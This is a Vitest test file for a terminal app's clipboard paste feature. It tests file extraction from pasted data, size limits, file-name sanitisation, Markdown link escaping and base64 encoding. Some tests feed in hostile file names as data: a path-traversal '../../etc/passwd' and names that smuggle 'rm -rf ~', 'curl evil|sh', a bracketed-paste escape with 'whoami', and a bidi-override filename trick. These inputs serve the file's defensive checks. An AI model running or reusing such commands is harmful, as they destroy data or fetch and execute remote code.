/** @vitest-environment jsdom */
import { describe, expect, it } from "vitest";
import {
  bytesToBase64,
  clipboardHasPlainText,
  markdownFileLink,
  pasteFileExtension,
  MAX_PASTE_FILE_BYTES,
  MAX_REMOTE_NAME_BYTES,
  pasteUploadFiles,
  sanitizePasteFileName,
  TERMINAL_CONTROL,
  truncateUtf8,
  splitOversizedFiles,
  uniquePasteFileNames,
} from "../../features/terminal/imagePaste";

interface StubItem {
  kind: string;
  type: string;
  file: File | null;
  directory?: string;
}

function dataTransferWith(items: StubItem[], text = ""): DataTransfer {
  return {
    items: items.map((item) => ({
      kind: item.kind,
      type: item.type,
      getAsFile: () => item.file,
      webkitGetAsEntry: () =>
        item.directory !== undefined ? { isDirectory: true, name: item.directory } : item.file ? { isDirectory: false, name: item.file.name } : null,
    })),
    files: items.filter((item) => item.kind === "file" && item.file).map((item) => item.file as File),
    getData: (type: string) => (type === "text/plain" ? text : ""),
  } as unknown as DataTransfer;
}

function png(name: string): File {
  return new File([new Uint8Array([0x89, 0x50, 0x4e, 0x47])], name, { type: "image/png" });
}

describe("pasteUploadFiles", () => {
  const txt = () => new File(["x"], "notes.txt", { type: "text/plain" });

  it("returns every File object, images and other files alike, in order", () => {
    const dt = dataTransferWith([
      { kind: "file", type: "image/png", file: png("a.png") },
      { kind: "file", type: "text/plain", file: txt() },
    ]);
    expect(pasteUploadFiles(dt).files.map((f) => f.name)).toEqual(["a.png", "notes.txt"]);
  });

  it("returns nothing for plain text and empty or null payloads", () => {
    const none = { files: [], skipped: [] };
    expect(pasteUploadFiles(dataTransferWith([{ kind: "string", type: "text/plain", file: null }], "echo hi"))).toEqual(none);
    expect(pasteUploadFiles(null)).toEqual(none);
    expect(pasteUploadFiles(dataTransferWith([]))).toEqual(none);
  });

  it("reports file items the browser will not hand over instead of dropping them silently", () => {
    expect(pasteUploadFiles(dataTransferWith([{ kind: "file", type: "image/png", file: null }]))).toEqual({
      files: [],
      skipped: ["无法读取的项目"],
    });
  });

  it("skips dropped folders visibly and still uploads the files next to them", () => {
    const dt = dataTransferWith([
      { kind: "file", type: "", file: new File([""], "src"), directory: "src" },
      { kind: "file", type: "text/plain", file: txt() },
    ]);
    const result = pasteUploadFiles(dt);
    expect(result.files.map((f) => f.name)).toEqual(["notes.txt"]);
    expect(result.skipped).toEqual(["文件夹「src」"]);
  });

  it("prefers files over text when a non-image File is present", () => {
    const dt = dataTransferWith([{ kind: "file", type: "application/pdf", file: new File(["p"], "d.pdf") }], "/home/me/d.pdf");
    expect(pasteUploadFiles(dt).files.map((f) => f.name)).toEqual(["d.pdf"]);
    const mixed = dataTransferWith(
      [
        { kind: "file", type: "image/png", file: png("icon.png") },
        { kind: "file", type: "text/plain", file: txt() },
      ],
      "notes.txt",
    );
    expect(pasteUploadFiles(mixed).files.map((f) => f.name)).toEqual(["icon.png", "notes.txt"]);
  });

  it("keeps the text paste when the only files are images next to plain text (spreadsheet or web copy)", () => {
    const dt = dataTransferWith([{ kind: "file", type: "image/png", file: png("a.png") }], "cell value");
    expect(pasteUploadFiles(dt)).toEqual({ files: [], skipped: [] });
  });

  it("falls back to files when items is missing", () => {
    const dt = { items: [], files: [txt()], getData: () => "" } as unknown as DataTransfer;
    expect(pasteUploadFiles(dt).files.map((f) => f.name)).toEqual(["notes.txt"]);
  });
});

describe("splitOversizedFiles", () => {
  it("keeps files at the limit and skips larger ones", () => {
    const at = new File([new Uint8Array(0)], "at.bin");
    Object.defineProperty(at, "size", { value: MAX_PASTE_FILE_BYTES });
    const over = new File([new Uint8Array(0)], "over.bin");
    Object.defineProperty(over, "size", { value: MAX_PASTE_FILE_BYTES + 1 });
    const { accepted, skipped } = splitOversizedFiles([at, over]);
    expect(accepted.map((f) => f.name)).toEqual(["at.bin"]);
    expect(skipped.map((f) => f.name)).toEqual(["over.bin"]);
  });
});

describe("remote file names", () => {
  const utf8Bytes = (text: string) => new TextEncoder().encode(text).length;

  it("removes separators, control and format characters, angle brackets and leading dots", () => {
    expect(sanitizePasteFileName("../../etc/passwd")).toBe("_.._etc_passwd");
    expect(sanitizePasteFileName(".bashrc")).toBe("bashrc");
    expect(sanitizePasteFileName("a\u0000b\nc.txt")).toBe("a_b_c.txt");
    expect(sanitizePasteFileName("a\u0085b\u2028c\u202ed.txt")).toBe("a_b_c_d.txt");
    expect(sanitizePasteFileName("<x>.txt")).toBe("_x_.txt");
    expect(sanitizePasteFileName("   ")).toBe("file");
    expect(sanitizePasteFileName("")).toBe("file");
  });

  it("limits length in UTF-8 bytes on a code-point boundary while keeping the extension", () => {
    const ascii = sanitizePasteFileName(`${"a".repeat(300)}.tar`);
    expect(utf8Bytes(ascii)).toBeLessThanOrEqual(MAX_REMOTE_NAME_BYTES);
    expect(ascii.endsWith(".tar")).toBe(true);

    const cjk = sanitizePasteFileName(`${"报告".repeat(60)}.pdf`);
    expect(utf8Bytes(cjk)).toBeLessThanOrEqual(MAX_REMOTE_NAME_BYTES);
    expect(cjk).toMatch(/^(报告|报)+\.pdf$/u);
    expect(cjk.length).toBeLessThan(120 + 4);

    const emoji = sanitizePasteFileName(`${"😀".repeat(80)}.png`);
    expect(utf8Bytes(emoji)).toBeLessThanOrEqual(MAX_REMOTE_NAME_BYTES);
    expect(emoji).toMatch(/^(😀)+\.png$/u);
    expect(truncateUtf8("a😀", 3)).toBe("a");
  });

  it("makes duplicate names unique within one paste and keeps suffixed names within the byte limit", () => {
    expect(uniquePasteFileNames(["a.txt", "a.txt", "A.txt", "b"])).toEqual(["a.txt", "a-2.txt", "A-3.txt", "b"]);
    const long = `${"文".repeat(100)}.txt`;
    const [first, second] = uniquePasteFileNames([long, long]);
    expect(first).not.toBe(second);
    expect(second).toMatch(/-2\.txt$/);
    expect(utf8Bytes(second)).toBeLessThanOrEqual(MAX_REMOTE_NAME_BYTES);
  });
});

describe("clipboardHasPlainText", () => {
  it("detects plain text in mixed clipboard data and lets the terminal handle the paste", () => {
    expect(clipboardHasPlainText(dataTransferWith([], "echo hi"))).toBe(true);
    expect(clipboardHasPlainText(dataTransferWith([], ""))).toBe(false);
    expect(clipboardHasPlainText(null)).toBe(false);
  });
});

describe("markdownFileLink", () => {
  it("creates a regular Markdown link, not an image embed, and escapes the text", () => {
    expect(markdownFileLink("shot.png", "/tmp/nexterm-paste-1.png")).toBe(
      "[shot.png](/tmp/nexterm-paste-1.png)",
    );
    expect(markdownFileLink("a[b]c.png", "/tmp/a.png")).toBe("[a\\[b\\]c.png](/tmp/a.png)");
    expect(markdownFileLink("", "/tmp/a.png")).toBe("[file](/tmp/a.png)");
  });

  it("wraps targets containing spaces or parentheses in angle brackets", () => {
    expect(markdownFileLink("a.png", "/tmp/my images/a.png")).toBe("[a.png](</tmp/my images/a.png>)");
    expect(markdownFileLink("a.png", "/tmp/a(1).png")).toBe("[a.png](</tmp/a(1).png>)");
  });

  it("percent-encodes angle brackets and control characters in the target", () => {
    expect(markdownFileLink("a", "/tmp/a>b <c.txt")).toBe("[a](</tmp/a%3Eb %3Cc.txt>)");
    expect(markdownFileLink("a", "/tmp/a\nb")).toBe("[a](/tmp/a%0Ab)");
  });

  // Hostile names must never put terminal control bytes into the inserted text, whichever path they take.
  it.each([
    ["newline", "x\nrm -rf ~\n.txt"],
    ["carriage return", "x\rcurl evil|sh\r.txt"],
    ["bracketed-paste terminator", "x\u001b[201~whoami\n.txt"],
    ["C1 CSI", "x\u009b201~.txt"],
    ["bidi override", "invoice\u202Etxt.exe"],
  ])("never emits control bytes for a %s name", (_label, raw) => {
    const name = sanitizePasteFileName(raw);
    const viaSanitised = markdownFileLink(name, `/tmp/nexterm-paste-x/${name}`);
    const viaRaw = markdownFileLink(raw, `/tmp/nexterm-paste-x/${raw}`);
    for (const link of [viaSanitised, viaRaw]) {
      expect(TERMINAL_CONTROL.test(link)).toBe(false);
      expect(link).not.toMatch(/[\p{Cf}\u2028\u2029]/u);
    }
  });
});

describe("pasteFileExtension", () => {
  it("prefers the filename extension and lowercases it", () => {
    expect(pasteFileExtension(png("shot.PNG"))).toBe("png");
    expect(pasteFileExtension(new File(["w"], "b.webp", { type: "image/webp" }))).toBe("webp");
  });

  it("falls back to the MIME subtype and then png when the filename has no extension", () => {
    expect(pasteFileExtension(new File(["x"], "pasted-image", { type: "image/gif" }))).toBe("gif");
    expect(pasteFileExtension(new File(["x"], "pasted-image", { type: "image/svg+xml" }))).toBe("png");
    expect(pasteFileExtension(new File(["x"], "pasted-image"))).toBe("png");
  });
});

describe("bytesToBase64", () => {
  it("round-trips small and chunked data", () => {
    const small = new Uint8Array([1, 2, 3, 250]);
    expect(bytesToBase64(small)).toBe(btoa(String.fromCharCode(...small)));

    const large = new Uint8Array(0x8000 + 17);
    for (let i = 0; i < large.length; i++) large[i] = i % 251;
    const decoded = atob(bytesToBase64(large));
    expect(decoded.length).toBe(large.length);
    for (let i = 0; i < large.length; i++) expect(decoded.charCodeAt(i)).toBe(large[i]);
  });
});
